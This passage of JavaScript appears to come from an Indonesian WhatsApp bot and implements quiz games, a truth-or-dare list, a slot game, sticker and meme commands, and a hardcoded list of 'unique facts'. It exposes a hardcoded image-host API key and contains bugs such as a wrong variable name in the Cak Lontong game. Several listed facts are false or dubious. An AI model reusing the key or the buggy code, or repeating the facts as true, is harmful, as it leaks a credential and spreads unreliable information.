*JAWABLAH SOAL BERIKUT*
*Soal :* ${hadeh.data.result.question}

Waktu : ${gamewaktu}s`, text, {quoted:mek})
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
let anau = hadeh.data.result.answer.toLowerCase()
game.addSiapa(from, anau, gamewaktu, siapaaku)
}
gameAdd(sender, glimit)
break
case 'caklontong': case 'cl':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
if (game.isCakLontong(from, caklontong)) return reply(`Masih ada soal yang belum di selesaikan`)
let ctt = await axios.get(`http://api.lolhuman.xyz/api/tebak/caklontong2?apikey=${lolkey}`)
console.log(ctt.data.result.answer)
bp = await YANZ.sendMessage(from, `─「 *CAK LONTONG* 」─

*JAWABLAH SOAL BERIKUT*
*Soal :* ${ctt.data.result.question}
*Petunjuk :* ${ctt.data.result.information}
Waktu : ${gamewaktu}s`, text, {quoted:mek})
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
let anah = crt.data.result.answer.toLowerCase()
game.addcak(from, anah, gamewaktu, caklontong)
}
gameAdd(sender, glimit)
break
case 'tebaklirik': case 'tl':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
if (game.isTebakLirik(from, tebaklirik)) return reply(`Masih ada soal yang belum di selesaikan`)
let capek = await axios.get(`https://api.lolhuman.xyz/api/tebak/lirik?apikey=${lolkey}`)
console.log(capek.data.result.answer)
bp = await YANZ.sendMessage(from, `─「 *TEBAK LIRIK* 」─

*JAWABLAH SOAL BERIKUT*
*Soal :* ${capek.data.result.question}
Waktu : ${gamewaktu}s`, text, {quoted:mek})
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
let anal = capek.data.result.answer.toLowerCase()
game.addlirik(from, anal, gamewaktu, tebaklirik)
}
gameAdd(sender, glimit)
break
case 'asahotak': case 'aso':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
if (game.isAsahOtak(from, asahotak)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/asahotak?apikey=${lolkey}`)
console.log(anu.data.result.jawaban)
bp = await YANZ.sendMessage(from, `─「 *ASAH OTAK* 」─

*JAWABLAH SOAL BERIKUT*
*Soal :* ${anu.data.result.pertanyaan}
Waktu : ${gamewaktu}s`, text, {quoted:mek})
setTimeout(() => {
YANZ.deleteMessage(from, bp.key)
}, gamewaktu+`000`)
let anjay = anu.data.result.jawaban.toLowerCase()
game.addotak(from, anjay, gamewaktu, asahotak)
}
gameAdd(sender, glimit)
break
case 'tebakkata': case 'tk':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
if (game.isTebakKata(from, tebakkata)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/susunkata?apikey=${lolkey}`)
console.log(anu.data.result.jawaban)
bp = await YANZ.sendMessage(from, `─「 *TEBAK KATA* 」─

*JAWABLAH SOAL BERIKUT*
*Soal :* ${anu.data.result.pertanyaan}
Waktu : ${gamewaktu}s`, text, {quoted:mek})
setTimeout(() => {
YANZ.deleteMessage(from, bp.key)
}, gamewaktu+`000`)
let ahhh = anu.data.result.jawaban.toLowerCase()
game.addkata(from, ahhh, gamewaktu, tebakkata)
}
gameAdd(sender, glimit)
break
case 'tebakkimia': case 'tuk':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
if (game.isTebakKimia(from, tebakkimia)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/unsurkimia?apikey=${lolkey}`)
console.log(anu.data.result.lambang)
bp = await YANZ.sendMessage(from, `─「 *TEBAK KIMIA* 」─

*JAWABLAH SOAL BERIKUT*
*Soal :* Lambang unsur ${anu.data.result.nama} adalah?
Waktu : ${gamewaktu}s`, text, {quoted:mek})
setTimeout(() => {
YANZ.deleteMessage(from, bp.key)
}, gamewaktu+`000`)
let revasayank = anu.data.result.lambang.toLowerCase()
game.addkimia(from, revasayank, gamewaktu, tebakkimia)
}
gameAdd(sender, glimit)
break
case 'tebakbendera': case 'tb':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
if (game.isTebakBendera(from, tebakbendera)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`https://api.lolhuman.xyz/api/tebak/bendera?apikey=${lolkey}`)
console.log(anu.data.result.name)
bp = await  YANZ.sendMessage(from, `─「 *TEBAK BENDERA* 」─
*JAWABLAH SOAL BERIKUT*
*Soal :* Bendera negara ( ${anu.data.result.flag} )
Waktu : ${gamewaktu}s`, text, {quoted:mek})
setTimeout(() => {
YANZ.deleteMessage(from, bp.key)
}, gamewaktu+`000`)
let ikasayank = anu.data.result.name.toLowerCase()
game.addbendera(from, ikasayank, gamewaktu, tebakbendera)
}
gameAdd(sender, glimit)
break
case 'family100': case 'f100':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
if (game.isfam(from, family100)) return reply(`Masih ada soal yang belum di selesaikan`)
let anu = await axios.get(`http://api.lolhuman.xyz/api/tebak/family100?apikey=${lolkey}`)
reply(`─「 *FAMILY100* 」─

*JAWABLAH SOAL BERIKUT*
*Soal :* ${anu.data.result.question}
*Total Jawaban :* ${anu.data.result.aswer.length}
Waktu : ${gamewaktu}s`, text, {quoted:mek})
setTimeout(() => {
YANZ.deleteMessage(from, bp.key)
}, gamewaktu+`000`)
let anoh = anu.data.result.aswer
let rgfds = []
for (let i of anoh){
let fefs = i.split('/') ? i.split('/')[0] : i
let iuhbb = fefs.startsWith(' ') ? fefs.replace(' ','') : fefs
let axsf = iuhbb.endsWith(' ') ? iuhbb.replace(iuhbb.slice(-1), '') : iuhbb
rgfds.push(axsf.toLowerCase())
}
game.addfam(from, rgfds, gamewaktu, family100)
}
gameAdd(sender, glimit)
break
case 'faktaunik':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  const dptdariRa = ["Negara Indonesia berada di posisi ke-4 sebagai Negara Terindah di Dunia versi situs First Choice.","Di Italia, dalam aturannya minuman Cappuccino hanya boleh di minum sebelum waktu siang.","AS, Australia, Finlandia, Jerman dan Kanada adl negara maju tanpa UN. Tahukah anda sekolah trbaik di dunia ada di Finlandia walau tanpa UN.","","\"Jengkol is very nice\" komentar Pierre Bouvier vokalis Simple Plan.","Tiap satu kali jari kita mengklik mouse komputer, ada 1,42 kalori yang terbakar dalam tubuh. (Penelitian, Convert Anything to Calories).","Di Jepang kuno, prajurit diolesi minyak kodok pada tubuh mereka dengan keyakinan bahwa hal itu akan membuat tubuh mereka antirobek."," Di Jepang, ketiduran saat bekerja (inemuri) dapat ditolerir, karena dipandang sebagai kelelahan yang muncul akibat bekerja terlalu keras.","Gergaji mekanik awalnya diciptakan sebagai alat kedokteran untuk membantu melahirkan bayi.","Jangan sering mengatakan kata  di Australia dan Selandia Baru. Di sana, kata berarti mengajak untuk melakukan hubungan seks.","Jamur merang Laetiporus dikenal sebagai julukan \"ayam hutan\" karena konon rasanya mirip seperti daging ayam goreng.","Kaki katak merupakan hidangan istimewa di eropa. Tahukah Anda: sekitar 80% impor katak Eropa berasal dari Indonesia.","Jika Anda mengetik \"do the harlem shake\" di search bar YouTube, layar akan melakukan Harlem Shake!. [Google Chrome]","Melihat melalui lubang kecil akan segera meningkatkan penglihatan Anda sementara.","YouTube menyebutkan rata-rata ada 4000 video baru Harlem Shake yang diunggah setiap hari. [Yahoo!]","Semut memiliki kuburan sendiri. Tapi tahukah anda: Gurita memiliki kebun dan suka berkebun. (wikipedia)","Coklat mengandung Theobromine, molekul organik yang dapat membantu menguatkan enamel gigi. (Penelitian dari Tulane University).","Wanita 2 kali lebih banyak menggunakan emoticon dalam pesan teks dibandingkan pria. (Penelitian di Rice University)","Biarpun Buzz Aldrin adalah orang kedua yang menginjak di bulan tetapi ia adalah orang pertama yang membuang kotoran di ruang angkasa.","Fakta unik berikutnya adalah, Psikolog mengatakan bahwa mengirim dan menerima pesan teks benar-benar dapat meningkatkan mood Anda ketika Anda merasa kesepian. (Telegraph)","Thailand merupakan satu-satunya negara di Asia Tenggara yang tidak pernah dijajah.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. (cracked .com)"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. (BBCnews)","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Semakin pahit cokelat (tinggi zat theobromine), semakin tinggi manfaatnya. Rajin mengkonsumsi 1bar cokelat/hari dapat menyembuhkan batuk kronis.","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".","Tidur Siang (Power Nap) trbukti menambah tinggi badan, dikrnkan saat kita tidur siang hormon pertumbuhan (Growth Hormone) lbh aktif bekerja.","Bilangan prima terbesar di dunia saat ini panjangnya 17 juta digit angka, cukup banyak untuk mengisi 28 lembar halaman pada buku novel.","Menurut sebuah studi, minum teh hijau setelah makan ikan membantu menghalangi zat Mercury yang terkandung dalam ikan memasuki aliran darah."," Memperpanjang usia handphone hingga 4 tahun dapat mengurangi dampak lingkungan sampai 40 persen. [Hasil studi di Swiss]","Duduk bersama dgn teman-teman / keluarga utk makan bersama, dpt meningkatkan kebahagiaan & membantu meringankan depresi. [ehealthnewsdaily]","Abibliophobia adalah fobia atau ketakutan terhadap kehabisan bahan bacaan.","Pada abad pertengahan di Eropa, garam sangat mahal harganya, sehingga disebut sebagai \"emas putih\".","Mengunyah permen karet dapat meningkatkan kemampuan berpikir cepat dan kewaspadaan hingga 10 persen. [Jurnal Brain and Cognition]","Wanita yang sedang stres selama kehamilannya cenderung melahirkan anak-anak yang pemarah. [Institute of Psychiatry, King College London]","","35. Disarankan supaya membeli sepatu pada sore hari. Sebab, setelah seharian berjalan, di sore hari kaki akan membesar 5-8 persen.","Musik memiliki kemampuan untuk memperbaiki kerusakan otak serta mengembalikan kenangan yang hilang. [cracked .com]","Menurut penelitian baru, usia harapan hidup anak band rata-rata lebih tinggi dibandingkan musisi yang memilih solo karir. (detikHealth)","Pulau Dewata Bali merupakan 1 dari 10 pulau paling romantis di dunia. [majalah Travel+Leisure]","Universitas di Jepang selalu melakukan upacara peringatan bagi hewan (contoh: tikus) yang mati dalam pengujian laboratorium. [web.archive .org]","Berkedip memberikan otak Anda istirahat sebentar. [para ilmuan di Japan’s Osaka University]","Wanita yang bahagia dalam sebuah pernikahan akan mengalami berat badan naik setengah pound (0,22 kg) setiap 6 bulan. [DailyMail]","Rasa cemburu berlebihan bisa digolongkan penyakit jiwa, krna dpt mendorong ssorg utk bunuh diri / menghabisi nyawa org lain. [riset]","","Mengkonsumsi buah tomat beberapa kali dlm kurun waktu seminggu dpt mengatasi perasaan depresi. [peneliti di Tianjin Medical Univ., Cina]"," Perasaan kesepian memicu respon yang sama di otak sebagai rasa sakit fisik. [BBCnews]","Di Cape Town, Afrika Selatan, remaja laki-laki yang memiliki gigi ompong dianggap tampan / maskulin.","Memeluk orang yg disayangi dpt membantu menurunkan tekanan darah, mengurangi stres dan","kecemasan, bahkn dpt meningkatkan memori. [Dailymail]","Kata \"Mouse\" (tikus) berasal dari turunan Bahasa Sansekerta \"Mus\" yang berarti \"pencuri\".Berjalan kaki atau bersepeda ke sekolah mempertajam konsentrasi siswa di kelas dan tetap bertahan sekitar 4 jam kemudian. [Medical Daily]","Menurut riset pasar global Euromonitor International, pria Korea adalah pria yang paling suka bersolek dari pria lain di dunia.","Rata-rata orang akan merasa 100 persen sehat / fit hanya 61 hari dalam setahun. (Penelitian di Inggris)","Polydactyl Cat adalah jenis kucing yang memiliki jempol di kaki mereka.","Hanya dengan mengurangi brightness dari televisi, anda mampu berhemat lebih dari Rp 1,5 juta setahun. [kompas]","Di Jerman, tahanan yg ingin meloloskan diri dr penjara adl bukan mrupakn perbuatan ilegal. Krn itu salah1 naluri dasar manusia untuk kebebasan.","Wanita merasa diri mereka terlihat paling jelek dan terlihat lebih tua pada hari Rabu pukul 15.30 . [studi baru dari St Tropez]Orang yang rutin bermain video game ternyata memiliki penalaran yang baik dibanding kebanyakan orang. (detikHealth)","Nama \"Gorila\" berasal dari kata Yunani \"Gorillai\" yang berarti \"perempuan berbulu\".","IBM mengatakan bahwa dalam kurun waktu 5 tahun ke depan, komputer bakal mirip manusia yang bisa melihat, mendengar, mencium dan merasakan.","Selama abad ke-13, kata \"nice\" sebenarnya berarti “stupid”, \"senseless\" dan “foolish\".","59. 49% dari pemilik Smartphone adalah jomblo. (Survei, \"2012 Online User Behavior and Engagement Study\")","Fakta Unik","60. Gazzarella adalah keju mozzarella yang terbuat dari susu kucing. 61. Rata-rata orang melihat / mengecek ponselnya sekitar 150 kali sehari. (Laporan Nokia pada MindTrek 2010)","Lalat dapat menyalurkan sekitar 300 bakteri setiap kali hinggap di benda.","Tertawa dapat meningkatkan aktivitas antibodi sekitar 20%, juga membantu untuk menghancurkan virus dan sel-sel tumor.","Fobia matematika (mathematics anxiety) memicu respon yang sama di otak sbg rasa sakit fisik. Gejalanya yaitu melihat angka saja sudah nyeri."," Karakter kartun Bugs Bunny diberi pangkat kehormatan sersan-mayor di Korps Marinir AS pada akhir Perang Dunia II. (wikipedia)","Apel yang ditaruh di ruang terbuka akan matang 10 kali lebih cepat dibandingkan dengan apel yang ditaruh di kulkas.","Ungkapan 'Smitten' adalah untuk menyebut 'naksir' dalam bahasa Inggris.","Menurut etiket internasional, sebuah jabat tangan yang tepat dan baik harus berlangsung selama sekitar 3 detik & dilepaskan setelah goyang.","Ketika kita sedang jatuh cinta, otak akan memproduksi dopamin ekstra, bahan kimia yang membuat seseorang menjadi gembira berlebihan."," \"Mwahahaha\" dan \"lolz\" telah ditambahkan ke Kamus Inggris Oxford.","Menurut penelitian, pria cenderung menurunkan volume suaranya ketika ia berbicara dg seseorang yg ia cintai, sementara perempuan sebaliknya.","Di Perancis, jajanan Arum Manis (Rambut Nenek) disebut \"Barbe á Papa\" yang berarti \"Jenggot Ayah\".","Menurut penelitian, PR terlalu banyak sebenarnya dapat menyebabkan siswa menjadi stres, depresi & mendapat nilai lebih rendah.","Hangry adalah penggabungan kata dari \"Hungry\" dan \"Angry\", di pakai ketika anda sedang lapar dan marah.","Kentut dari bakteri membuat keju swiss memiliki lubang-lubang.","Mendengarkan musik benar-benar dapat mengurangi rasa sakit kronis hingga 20% dan membantu meringankan depresi hingga 25%. (sciencedaily)","Orang yang merasa kesepian memiliki kemungkinan mengalami kepikunan 70-80% lebih tinggi. (Journal of Neurosurgery Neurologi and Psychiatry)","Melamun dpt memendekkan telomere (bagian paling ujung sel DNA) yang berperan dlm menjaga kestabilan sel, dimana dapat mempercepat proses penuaan."]
  const thanks = dptdariRa[Math.floor(Math.random() * dptdariRa.length)]
  reply(`*Fakta Unik :*\n${thanks}`)
  }
  break
  case 'pantun':{
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  const dptdariRaa = ["\nAnak tikus rindu ibunya\n\nsombong nich ceritanya","\nAda kepompong ada kupu\n\nbales donk sms dari aku","\nBeli bandeng\n\ndi Malaysia\n\ngue ganteng\n\nkayak Pasha","\nHati siapa tak bimbang\n\nsitu botak minta dikepang","\nBuah semangka\n\nbuah duren\n\nnggak nyangka\n\ngue keren\n ","\n Mawar bersemi\n\ndi batang kayu\n\ndo you love me\n\nlike i love you","\nBurung perkutut\n\nburung kuthilang\n\nkamu kentut\n\nenggak bilang bilang","\nBread is roti\n\nshadow is bayang\n\nbefore you mati\n\nbetter you sembahyang","\nJangan takut\n\njangan khawatir\n\nitu kentut\n\nbukan petir","\nBeli ikan di pasar malam\n\ndasar bego ni kawan","\nMakan duren sambil ngelamun,\n\nHati-hati ketelen ntar bijinya","\nDi  sana gunung, di sini gunung\n\nCiptaan Tuhan deh","\nKan bandeng\n\nmakan kawat\n\norang ganteng\n\nnumpang lewat","\nOrang ganteng\n\nsuka sama si Rini\n\ngak seneng\n\nmaju sini","\nMelon manis di air es\n\nke mana aja lo gak pernah sms","\nJambu merah\n\ndi dinding\n\njangan marah\n\njust kidding","\nBuah semangka\n\nbuah manggis\n\nnggak nyangka\n\ngue manis","\nMen sana\n\nin corpore sano\n\ngue maen ke sana,\n\nelo maen ke sono!","\nBuah apel\n\ndi air payau\n\nnggak level\n\nlayauuuuuuu","\nDi sini bingung, di sana linglung\n\nemangnya enak, enggak nyambung…","\nBuah semangka berdaun sirih\n\nBuah ajaib kali yah","\nPilih suara harpa yang jelas.\n\nTali di harpa diikat cinta","\nCiuman di pipi\n\nciuman di dahi\n\nApa yang dicium sesudah lah cinta?","\nSepandai-pandai tupai melompat\n\nPolisi lebih pandai melompat","\nDua tiga kacang tanah\n\nenggak ada pacar yang datang ke rumah","\nDapet kado isinya tomat\n\nBodo amat!!","\nDulu delman, sekarang gokar\n\ndulu teman, sekarang pacar","\nStroberi mangga apel\n\nsorry gak level","\nBola pingpong dimakan gelatik\n\nBiar ompong yang penting cantik\n","\nMata belo,\n\nala komedian.\n\ngue sama elo?\n\nmaunya jadian.","\nTunda lapar,\n\nmakan indomi.\n\nhati menggelepar,\n\ncintapun bersemi.","\nPotong kuku,\n\npendek-pendek.\n\nhatiku beku,\n\nsi abang mendadak ngondek.","\nBeli ketan,\n\nbeli kain songket.\n\nbiar udah mantan,\n\nkita tetep lengket.","\nKe pasar, nyari obat gatal\n\nDasar, gak modal!","\nMakan semangka,\n\nmakan kedondong.\n\nkalau suka,\n\nnyatain dong.","\nGa punya pendirian,\n\nbikin jemu.\n\nga mau sendirian,\n\nmaunya bobo sama kamu.","\nNembak itik,\n\nlangsung kena.\n\nkamu cantik,\n\nhey nona!","\nKotak amal,\n\ndigoyang-goyang.\n\nkemarin aku diramal,\n\njodohnya sama abang.","\nHari Jumat,\n\npada pake batik.\n\nsalam hormat,\n\nbuat neng cantik.","\nPecahan genting,\n\ndi bawah kursi.\n\nbetah meeting,\n\nkarena si boss seksi.","\nNangis-nangis,\n\nmobil kena srempet.\n\nneng manis,\n\nmau dong dipepet.","\nPanasin mentega,\n\nkarena mulai beku.\n\nkamu mau ga,\n\njadi imamku?","\nPotong sebahu,\n\nbiar ga sendu.\n\nkamu tahu?\n\nAku rindu.","\nJangan tanya,\n\nkapan lulus kuliah.\n\nga dapet anaknya,\n\nmamanya boleh lah","\nBikin anak,\n\ndi pojokan sekolah\n\nkalau mau enak,\n\nnikah dulu lah.","\nMain mata,\n\nmesem-mesem.\n\nneng tetep cinta,\n\nbiarpun abang keteknya asem.","\nTiduran di tandu,\n\nberjam-jam.\n\nhati merindu,\n\nmata sulit memejam.","\nUbek-ubek peti,\n\ncari gunting.\n\nsaking cinta mati,\n\nneng rela bunting.","\nNamanya penjahat,\n\npolisi jadi inceran.\n\nbosan jadi temen curhat,\n\nmaunya pacaran.","\nKe salon creambath,\n\nbiar aliran darah lancar.\n\nbosen ah jadi sahabat,\n\nmaunya jadi pacar!"]
  const thanks = dptdariRaa[Math.floor(Math.random() * dptdariRaa.length)]
  reply(`*Pantun :* \n${thanks}`)
  }
  break
  case 'dare':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  const dare =['Kirim pesan ke mantan kamu dan bilang "aku masih suka sama kamu','telfon crush/pacar sekarang dan ss ke pemain','pap ke salah satu anggota grup','Bilang "KAMU CANTIK BANGET NGGAK BOHONG" ke cowo','ss recent call whatsapp','drop emot "🦄💨" setiap ngetik di gc/pc selama 1 hari','kirim voice note bilang can i call u baby?','drop kutipan lagu/quote, terus tag member yang cocok buat kutipan itu','pake foto sule sampe 3 hari','ketik pake bahasa daerah 24 jam','ganti nama menjadi "gue anak lucinta luna" selama 5 jam','chat ke kontak wa urutan sesuai %batre kamu, terus bilang ke dia "i lucky to hv you','prank chat mantan dan bilang " i love u, pgn balikan','record voice baca surah al-kautsar','bilang "i hv crush on you, mau jadi pacarku gak?" ke lawan jenis yang terakhir bgt kamu chat (serah di wa/tele), tunggu dia bales, kalo udah ss drop ke sini','sebutkan tipe pacar mu!','snap/post foto pacar/crush','teriak gajelas lalu kirim pake vn kesini','pap mukamu lalu kirim ke salah satu temanmu','kirim fotomu dengan caption, aku anak pungut','teriak pake kata kasar sambil vn trus kirim kesini','teriak " anjimm gabutt anjimmm " di depan rumah mu','ganti nama jadi " BOWO " selama 24 jam','Pura pura kerasukan, contoh : kerasukan maung, kerasukan belalang, kerasukan kulkas, dll']
  const der = dare[Math.floor(Math.random() * dare.length)]
  replybutton(from, `${prefix}dare`, `selamat ${waktoo}`, `➡️ NEXT ➡️`, `*DARE :*\n${der}`)
  break
  case 'truth':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  const trut =['Pernah suka sama siapa aja? berapa lama?','Kalau boleh atau kalau mau, di gc/luar gc siapa yang akan kamu jadikan sahabat?(boleh beda/sma jenis)','apa ketakutan terbesar kamu?','pernah suka sama orang dan merasa orang itu suka sama kamu juga?','Siapa nama mantan pacar teman mu yang pernah kamu sukai diam diam?','pernah gak nyuri uang nyokap atau bokap? Alesanya?','hal yang bikin seneng pas lu lagi sedih apa','pernah cinta bertepuk sebelah tangan? kalo pernah sama siapa? rasanya gimana brou?','pernah jadi selingkuhan orang?','hal yang paling ditakutin','siapa orang yang paling berpengaruh kepada kehidupanmu','hal membanggakan apa yang kamu dapatkan di tahun ini','siapa orang yang bisa membuatmu sange','siapa orang yang pernah buatmu sange','(bgi yg muslim) pernah ga solat seharian?','Siapa yang paling mendekati tipe pasangan idealmu di sini','suka mabar(main bareng)sama siapa?','pernah nolak orang? alasannya kenapa?','Sebutkan kejadian yang bikin kamu sakit hati yang masih di inget','pencapaian yang udah didapet apa aja ditahun ini?','kebiasaan terburuk lo pas di sekolah apa?']
  const ttrth = trut[Math.floor(Math.random() * trut.length)]
  replybutton(from, `${prefix}truth`, `selamat ${waktoo}`, `➡️ NEXT ➡️`, `*TRUTH :*\n${ttrth}`)
  break
  case 'slot':
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isGame(sender, isOwner, gcount, glimit)) return reply(mess.glimit)
  const sotoy = ['🍊 : 🍒 : 🍐','🍒 : 🍐 : 🍊','🍐 : 🍒 : 🍐','🍊 : 🍋 : 🔔','🔔 : 🍒 : 🍐','🔔 : 🍒 : 🍊','🍊 : 🍋 : 🔔','🍐 : 🍒 : 🍋','🍐 : 🍐 : 🍐','🍊 : 🍒 : 🍒','🔔 : 🔔 : 🍇','🍌 : 🍒 : 🔔','🍐 : 🔔 : 🔔','🍊 : 🍋 : 🍒','🍋 : 🍋 : 🍌','🔔 : 🔔 : 🍇','🔔 : 🍐 : 🍇','🔔 : 🔔 : 🔔','🍒 : 🍒 : 🍒','🍌 : 🍌 : 🍌','🍇 : ?? : 🍇']
  somtoy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
  somtoyy = sotoy[Math.floor(Math.random() * (sotoy.length))]
  somtoyyy = sotoy[Math.floor(Math.random() * (sotoy.length))]	
  rn = randomNomor(100)
  if (somtoyy  == '🍌 : 🍌 : 🍌') {
  bp = await replybutton1(from, `${prefix}slot`, `ingin main lagi? klik di bawah 👇`,`➡️ NEXT ➡️`, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`)
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
  addBalance(sender, rn, balance)
  } else if (somtoyy == '🍒 : 🍒 : 🍒') {
  bp = await replybutton1(from, `${prefix}slot`, `ingin main lagi? klik di bawah 👇`,`➡️ NEXT ➡️`, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`)
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
  addBalance(sender, rn, balance)
  } else if (somtoyy == '🔔 : 🔔 : 🔔') {
  bp = await replybutton1(from, `${prefix}slot`, `ingin main lagi? klik di bawah 👇`,`➡️ NEXT ➡️`, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`)
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
  addBalance(sender, rn, balance)
  } else if (somtoyy == '🍐 : 🍐 : 🍐') {
  bp = await replybutton1(from, `${prefix}slot`, `ingin main lagi? klik di bawah 👇`,`➡️ NEXT ➡️`, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`)
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
  addBalance(sender, rn, balance)
  } else if (somtoyy == '🍇 : 🍇 : 🍇') {
  bp = await replybutton1(from, `${prefix}slot`, `ingin main lagi? klik di bawah 👇`,`➡️ NEXT ➡️`, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲ 👑 *YOU WIN* 👑 ❳──\nHADIAH : $${rn}`)
  setTimeout(() => {
  YANZ.deleteMessage(from, bp.key)
  }, gamewaktu+`000`)
  addBalance(sender, rn, balance)
  } else {
  ok = await replybutton1(from, `${prefix}slot`, `ingin main lagi? klik di bawah 👇`,`➡️ NEXT ➡️`, `─「 🎰  *SLOT*  🎰 」─\n\n${somtoy}\n${somtoyy} <======\n${somtoyyy}\n\n──❲  *YOU LOSE*  ❳──\nXP BERKURANG 1000`)
  setTimeout(() => {
  YANZ.deleteMessage(from, ok.key)
  }, gamewaktu+`000`)
  addLevelingXp(sender, -1000)
  }
  gameAdd(sender, glimit)
  break
  case 'attp':{ 
  if (!isUser) return reply(mess.noregis)
  if (isBan) return reply(mess.ban)
  if (isLimit(sender, isPrem, isOwner, limitawal, limit)) return reply(mess.limit)
  if (args.length < 1) return reply(`Kirim perintah *${prefix}attp* teks`)
  let ane = await getBuffer(`https://api.xteam.xyz/attp?file&text=${q}`)
  fs.writeFileSync('./sticker/attp.webp', ane)
  exec(`webpmux -set exif ./sticker/data.exif ./sticker/attp.webp -o ./sticker/attp.webp`, async (error) => {
  if (error) return reply(mess.error)
  YANZ.sendMessage(from, fs.readFileSync(`./sticker/attp.webp`), sticker, {quoted: mek})
  fs.unlinkSync(`./sticker/attp.webp`)
  })
  }
  limitAdd(sender, limit)
  break

    case 'memegenerator':
    case 'memegen':
   if (isBan) return reply(mess.ban)
   if (!isPrem && !mek.key.fromMe) return reply(mess.only.prem)
   if (args.length < 1) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
   if (!q.includes('|')) return reply(`Kirim perintah *${prefix + command}* teks atas|teks bawah`)
   try {
   if (!isQuotedImage && !isQuotedSticker) return reply(`REPLY GAMBAR ATAU STICKER!!`)
   reply(mess.wait)
   var teks1 = q.split('|')[0] ? q.split('|')[0] : ''
   var teks2 = q.split('|')[1] ? q.split('|')[1] : ''
   var imgbb = require('imgbb-uploader')
   var enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   var media = await YANZ.downloadAndSaveMediaMessage(enmedia)
   var njay = await imgbb('3b8594f4cb11895f4084291bc655e510', media)
   var resu = await getBuffer(`https://api.memegen.link/images/custom/${teks1}/${teks2}.png?background=${njay.display_url}`)
   YANZ.sendMessage(from, resu, image, {thumbnail:gambar2, quoted: mek})
    fs.unlinkSync(media)
    } catch (e) {
    return reply(`${e}`)
    console.log(e)
    }
   break
   case 'stickermeme': case 'memesticker': case 'memestick': case 'stickmeme': case 'stcmeme': case 'smeme':
  if (isBan) return reply(mess.ban)
   if (!isPrem && !mek.key.fromMe) return reply(mess.only.prem)
   try {
   if (!q) return reply(`━「 *ERROR* 」━\n\n*Usage :*\n• *_Reply gambar atau sticker dengan Caption ${prefix+command} teks_*\n*Example :*\n• *_${prefix+command+' '+namabot}_*`)
   var bawah = q.replace('', '_').replace('\n','%5Cn').replace('?', '~q').replace('%', '~p').replace('&', '~a').replace('#', '~h').replace('/', '~s')
   if (isImage || isQuotedImage) {
   reply(mess.wait)
   var imgbb = require('imgbb-uploader')
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await YANZ.downloadAndSaveMediaMessage(encmedia, `./sticker/${sender}`)
   var tolink = await imgbb("3b8594f4cb11895f4084291bc655e510", media)
   var sticknye = `https://api.memegen.link/images/custom/-/${bawah}.png?background=${tolink.display_url}`
   var short = await axios.get('https://tinyurl.com/api-create.php?url=' + sticknye)
   var anuu = await getBuffer(`https://api.lolhuman.xyz/api/convert/towebp?apikey=${lolkey}&img=${short.data}`)
